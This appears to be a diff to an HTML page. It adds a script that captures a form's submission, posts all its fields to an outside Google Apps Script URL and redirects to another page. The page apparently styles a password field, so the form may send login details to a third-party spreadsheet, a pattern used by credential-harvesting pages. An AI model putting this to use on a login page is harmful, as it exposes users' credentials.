@@ -92,6 +92,16 @@ span.psw {
 
  
 </form>
-
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbyuKk8p3cqR5Z4Bkt6xEHpfRaJ-Qd83wAW1wtpeBMy--2nKntdyjeK8SXyLDxFpAg1V2Q/exec'
+  const form = document.forms['google-sheet']
+   
+   form.addEventListener('submit', e => {
+     e.preventDefault()
+     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+       .then(response =>  window.location.href='1st.html')
+       .catch(error => console.error('Error!', error.message))
+   })
+</script>
 </body>
 </html>
